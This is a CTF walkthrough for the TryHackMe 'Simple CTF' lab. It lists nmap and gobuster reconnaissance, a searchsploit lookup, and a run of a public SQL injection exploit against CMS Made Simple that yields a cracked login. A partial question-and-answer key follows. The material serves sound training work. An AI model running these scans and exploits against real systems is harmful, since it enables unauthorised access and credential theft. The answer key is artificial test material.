TryHackMe | SimpleCTF

https://tryhackme.com/r/room/easyctf

WriteUps:

https://medium.com/@akerkar34/simple-ctf-tryhackme-walkthrough-13fae8abe32d


---
#### nmap scan:
`nmap -sC -sV -A 10.10.90.196 -vv -oN nmap`

```
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.16.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

#### gobuster hidden directory scan:
`gobuster dir -u http://10.10.90.196 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirb.txt`

```
# Found directory:
10.10.90.196/simple
# Navigate to directory and found: " This site is powered by CMS Made Simple version 2.2.8 "
```



#### search for exploits involving that CMS:

`searchsploit cms made simple`

```
CMS Made Simple < 2.2.10 - SQL Injection                                                               | php/webapps/46635.py
# search google for php/webapps/46635.py and copy script locally
```


#### run script on target:
`python2 exploit.py -u http://10.10.90.196/simple --crack -w /usr/share/wordlists/rockyou.txt`

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```


---
#### Key:


Q: How many services are running under port 1000?

2

Q: What is running on the higher port?

SSH


Q: What's the CVE you're using against the application?

Q: To what kind of vulnerability is the application vulnerable?

Q: What's the password?

Q: Where can you login with the details obtained?

Q: What's the user flag?

Q: Is there any other user in the home directory? 

Q: What's its name?

Q: What can you leverage to spawn a privileged shell?